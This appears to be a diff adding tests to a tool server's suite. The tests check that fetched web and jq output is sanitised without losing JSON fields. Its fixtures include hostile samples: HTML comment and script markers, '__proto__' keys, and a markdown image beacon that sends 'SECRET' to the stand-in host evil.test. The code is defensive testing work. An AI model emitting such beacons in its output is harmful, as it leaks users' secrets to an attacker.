@@ -52,18 +52,36 @@ const { registerAllCapabilities } = await import("../server/registration.js");
 
 const mockedExecuteCommand = executionModule.executeCommand as Mock;
 
-/** Build cURL output as the real executor hands it back. */
-function curlOutput(body: string, contentType: string) {
+/**
+ * Build cURL output as the real executor hands it back.
+ *
+ * `headerBlock` is the response-header descriptor's content. It is a separate
+ * argument rather than part of `body` because the two travel on separate
+ * descriptors in production (invariant 13) — a test that concatenated them
+ * would be asserting against a composition the executor never produces.
+ */
+function curlOutput(body: string, contentType: string, headerBlock?: string) {
     return {
         stdoutBytes: Buffer.concat([
             Buffer.from(body, "utf8"),
             Buffer.from(`${SEP}${contentType}`, "utf8"),
         ]),
-        headerBytes: undefined,
-        headerBytesReceived: undefined,
+        headerBytes: headerBlock === undefined ? undefined : Buffer.from(headerBlock, "utf8"),
+        headerBytesReceived:
+            headerBlock === undefined ? undefined : Buffer.byteLength(headerBlock, "utf8"),
         stderr: "",
         exitCode: 0,
     };
+}
+
+/** A minimal response-header block, as cURL dumps it. */
+const HEADER_BLOCK = "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n";
+
+/** Pull the JSON body out of a plain-branch response that carries a header prefix. */
+function bodyAfterHeaders(text: string): unknown {
+    const match = text.match(/\{[\s\S]*\}/);
+    if (match === null) throw new Error(`no JSON body in response: ${text}`);
+    return JSON.parse(match[0]);
 }
 
 /**
@@ -295,6 +313,161 @@ describe("registerAllTools — the shipped binary's registration path", () => {
                 neg: "-0.0",
             });
         });
+
+        // ---------------------------------------------------------------
+        // The `include_headers` arm. `formatResponse` prefixes the header
+        // block to the body on the plain branch, so the composed string does
+        // not parse as JSON and the wrap's UNDIVIDED arm ran over it — pairing
+        // a marker in one body field with one in a later field and deleting
+        // what lay between. Routing the binary through the wrap is what
+        // exposed this: measured `["a","d"]` here against `["a","b","c","d"]`
+        // on the pre-wrap registration, so it was a regression of this
+        // branch's own making rather than the pre-existing defect
+        // `docs/todos/012` described. The body is now defended as its own
+        // region before composition.
+        //
+        // These assert on the SHIPPED path rather than on `defendForInline`
+        // directly, because the defect lived in the composition and a direct
+        // assertion on the defence never sees it.
+        // ---------------------------------------------------------------
+        it("keeps every key when a header block is prefixed to the body", async () => {
+            const body = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(body, "application/json", HEADER_BLOCK)
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+        });
+
+        it("keeps every key for a script pair behind a header block", async () => {
+            const body = '{"a":"<script>","b":"secret","c":"</script>","d":"kept"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(body, "application/json", HEADER_BLOCK)
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+        });
+
+        it("keeps every key for a style pair behind a header block", async () => {
+            const body = '{"a":"<style>","b":"secret","c":"</style>","d":"kept"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(body, "application/json", HEADER_BLOCK)
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+        });
+
+        // The fix must WIDEN the defence over this arm, not exempt the channel.
+        // Without this, defending the body early and then skipping the wrap
+        // would pass every assertion above while letting a beacon through.
+        it("still strips a beacon on the header-prefixed arm", async () => {
+            const body = '{"n":"![x](https://evil.test/?d=SECRET)"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(body, "application/json", HEADER_BLOCK)
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(text).toContain("[image removed]");
+            expect(text).not.toContain("evil.test");
+        });
+
+        // Positive control: the header region is defended by
+        // `extractHeaderChannel` before assembly, so an unpaired opener in
+        // header text has nothing to pair WITH in the body. If a future edit
+        // stops stripping the header region, this catches it — the body's
+        // first line would be consumed.
+        it("does not let an unpaired opener in header text eat the body", async () => {
+            const body = '{"first":"kept","second":"also kept"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(
+                    body,
+                    "application/json",
+                    "HTTP/1.1 200 OK\r\nx-trace: a<!--b\r\n\r\n"
+                )
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["first", "second"]);
+        });
+
+        // ---------------------------------------------------------------
+        // A remote picks these keys, and `__proto__` is the one that is not a
+        // key at all on a `{}` accumulator — assignment reaches
+        // `Object.prototype`'s inherited setter, the field never becomes an own
+        // property, and `JSON.stringify` omits it. Measured before the fix:
+        // two fields in, one out, silently, leaving valid JSON.
+        // ---------------------------------------------------------------
+        it("keeps a __proto__ field the origin sent", async () => {
+            const body = '{"__proto__":{"value":"kept"},"ok":"also kept"}';
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            const returned = JSON.parse(text) as Record<string, unknown>;
+            expect(Object.keys(returned)).toEqual(["__proto__", "ok"]);
+            expect(returned["ok"]).toBe("also kept");
+        });
+
+        it("keeps a __proto__ field inside a nested document leaf", async () => {
+            // Written as literal JSON, never via an object literal: a
+            // `__proto__:` key in JS source sets the prototype instead of
+            // creating an own property, so `JSON.stringify` would emit a
+            // fixture with the field already missing and the test would pass
+            // against the unfixed code.
+            const nested = '{"__proto__":{"v":"kept"},"ok":"also kept"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(JSON.stringify({ outer: nested }), "application/json")
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            const outer = (JSON.parse(text) as { outer: string }).outer;
+            expect(Object.keys(JSON.parse(outer) as object)).toEqual(["__proto__", "ok"]);
+        });
     });
 
     // ---------------------------------------------------------------------
@@ -332,6 +505,56 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).toContain("[image removed]");
             expect(text).not.toContain("evil.test");
             expect(text).not.toContain("SECRET");
+        });
+
+        // Settles the instance `docs/todos/012` recorded as SUSPECTED rather
+        // than confirmed: jq output is a document whose leaves can themselves
+        // be documents, so the splice class had a candidate here that nobody
+        // had executed. It does not apply — `executeJqQuery` returns one
+        // string with nothing prefixed to it, so the composed-string arm
+        // cannot be reached, and both shapes jq can emit take the region-wise
+        // path. Asserted rather than argued, because "no composition here" is
+        // a claim about code that can change.
+        it("keeps every key when the filter returns a whole document", async () => {
+            const file = join(dir, "doc.json");
+            await writeFile(
+                file,
+                '{"outer":{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}}',
+                "utf-8"
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("jq_query")!(
+                    JqQuerySchema.parse({ filepath: file, jq_filter: ".outer" }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(Object.keys(JSON.parse(text) as object)).toEqual(["a", "b", "c", "d"]);
+        });
+
+        it("keeps every key when the filter returns a document as a string leaf", async () => {
+            const file = join(dir, "leaf.json");
+            const nested = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
+            await writeFile(file, JSON.stringify({ note: nested }), "utf-8");
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("jq_query")!(
+                    JqQuerySchema.parse({ filepath: file, jq_filter: ".note" }),
+                    { sessionId: undefined }
+                )
+            );
+
+            // The filter yields a JSON string whose content is a document; the
+            // wrap's string-leaf arm is what has to divide it.
+            expect(Object.keys(JSON.parse(JSON.parse(text) as string) as object)).toEqual([
+                "a",
+                "b",
+                "c",
+                "d",
+            ]);
         });
     });
 });
